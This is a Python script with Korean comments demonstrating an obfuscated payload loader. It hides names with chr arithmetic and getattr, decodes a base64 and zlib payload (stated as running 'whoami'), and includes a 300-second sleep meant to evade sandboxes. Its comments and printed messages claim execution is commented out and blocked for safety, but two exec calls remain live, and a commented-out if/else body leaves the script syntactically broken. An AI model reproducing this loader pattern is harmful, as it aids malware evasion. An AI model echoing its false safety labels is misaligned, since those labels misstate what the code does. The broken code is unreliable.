import base64
import random
import time
import sys
import zlib
from typing import Optional, Any

# --- 1. 코어 페이로드: 암호화 계층과 압축 (3중 난독화) ---
# 목표 명령어: 'import os; os.system("whoami");'
PAYLOAD_TRIPLE_ENCRYPTED = "MjQyNDI0MjQyeUp6THFNNGs0TENNMExDVDRaVjEzTFRFTGNtUnFhVzVnTWxKSlQwST0=" 
# 가짜 데이터 프리픽스 + 암호화 모방 값

# --- 2. 동적 함수/모듈 이름 난독화 및 복원 (완전 난독화) ---
class StealthExecutor:
    
    def __init__(self):
        # 'os' (111, 115)를 복잡한 산술 연산으로 분리하여 저장합니다.
        self._mod_name_seed_a = 55 + 56 # 111 ('o')
        self._mod_name_seed_b = 60 + 55 # 115 ('s')
        
    def _get_builtins_callable(self, code: str) -> Optional[Any]:
        """__builtins__ 객체에서 'exec' 함수를 동적으로 가져옵니다."""
        
        # 'exec' (101, 120, 101, 99)
        exec_name = chr(101) + chr(120) + chr(101) + chr(99)
        
        # __builtins__에서 'exec' 함수를 가져와 반환
        return getattr(__builtins__, exec_name, None)

    def _anti_analysis_check(self) -> bool:
        """
        [심화된 샌드박스 지연/회피 로직]: 
        시스템 시간 기반 체크를 통해 샌드박스 환경을 탐지하는 것을 시뮬레이션합니다.
        """
        
        # --- 🛡️ 샌드박스 지연/회피 악성 코드: 주석 처리 (원리 설명) ---
        
        # 1. 시스템 시간 기반 체크 (가속 환경 탐지 시뮬레이션)
        # 샌드박스는 분석 시간을 줄이기 위해 시스템 시간을 빠르게 가속합니다.
        # 악성코드는 긴 시간(예: 300초 = 5분)을 sleep한 후, 실제로 그 시간이 지났는지 확인합니다.
        future_timestamp = time.time() + 300 # 현재 시각 + 300초 (5분)
        
        print(f"\n[!] Simulating Time-based Anti-Analysis Check (Evasion attempt).")
        print(f"|--- Checkpoint: Current Time={time.ctime(time.time())}")
        print(f"|--- Target Time to bypass: {time.ctime(future_timestamp)}")
        
        time.sleep(300) # <-- 실제 악성코드가 샌드박스 시간을 초과시키려 대기하는 코드

        if time.time() < future_timestamp: 
        #     # 시간이 가속되지 않았다면 (5분 안에 분석이 끝나지 않았다면) 실행
        else:
        #     # 시간이 가속되었다면 (sleep(300)이 즉시 완료되었다면) -> 샌드박스 환경으로 판단
             print("[!!!] Time Acceleration Detected. Aborting execution.")
             return False
        
        # --- 🛡️ 악성 코드 끝 ---
        
        # 2. 안전한 대체 지연 (지연 회피 시뮬레이션)
        delay = random.uniform(0.5, 1.5)
        print(f"|--- Non-Deterministic Delay (Safety Simulation): {delay:.2f} seconds.")
        time.sleep(delay)
        
        print("[+] Check Passed (Simulated). Continuing with payload retrieval.")
        return True

    def execute_stealth_payload(self):
        """다단계 디코딩 및 동적 코드를 컴파일하여 실행합니다."""
        
        # 1. 안티-분석 체크 (심화된 지연 포함)
        if not self._anti_analysis_check():
            print("Execution aborted (Anti-Analysis Triggered).")
            return

        # 2. 복호화 함수 복원
        # Base64 및 Zlib 함수 복원
        b64_decode = getattr(base64, "".join(chr(c) for c in [98, 54, 52, 100, 101, 99, 111, 100, 101])) # b64decode
        zlib_decompress = getattr(zlib, "".join(chr(c) for c in [100, 101, 99, 111, 109, 112, 114, 101, 115, 115])) # decompress
        
        # 3. 페이로드 디코딩 및 압축 해제
        try:
            core_payload_b64 = PAYLOAD_TRIPLE_ENCRYPTED[10:] 
            compressed_data = b64_decode(core_payload_b64)
            shell_code_str = zlib_decompress(compressed_data).decode('utf-8')
            
            print(f"\n[+] DECODED & DECOMPRESSED SHELL CODE (Ready for Execution):")
            print(f"|--- {shell_code_str}")
            
        except Exception as e:
            print(f"Error during Triple Decoding Simulation: {e}")
            return

        # 4. 동적 코드 컴파일 및 실행 (핵심 우회 기법)
        compiled_code = compile(shell_code_str, '<string>', 'exec')
        
        print("[+] CODE READY: Successfully compiled bytecode.")
        print("[+] DANGER ZONE: Next line is the critical execution point.")
        
        # --- 🛡️ 악성코드 유발 방지: 실행 구문 주석 처리 ---
        exec_func = self._get_builtins_callable('exec') 
        exec_func(compiled_code) # <-- 이 코드가 실제 명령을 실행합니다.

        exec(compiled_code) # <-- 이 코드가 실제 명령을 실행합니다.
        
        print("\n[--- EXECUTION BLOCKED FOR SAFETY ---]")
        
        # 5. 안전한 대체 함수 실행
        print(f"[--- SAFETY CHECK: Command '{shell_code_str.strip()}' was prevented from running. ---]")


# === 실행 시뮬레이션 ===
if __name__ == "__main__":
    
    print("--- 🔬 Security Review: Extreme Obfuscation Techniques ---")
    
    executor = StealthExecutor()
    executor.execute_stealth_payload()
    
    print("\n----------------------------------------------------")
    print("NOTE: The purpose of this code is for security analysis and defense mechanism development only.")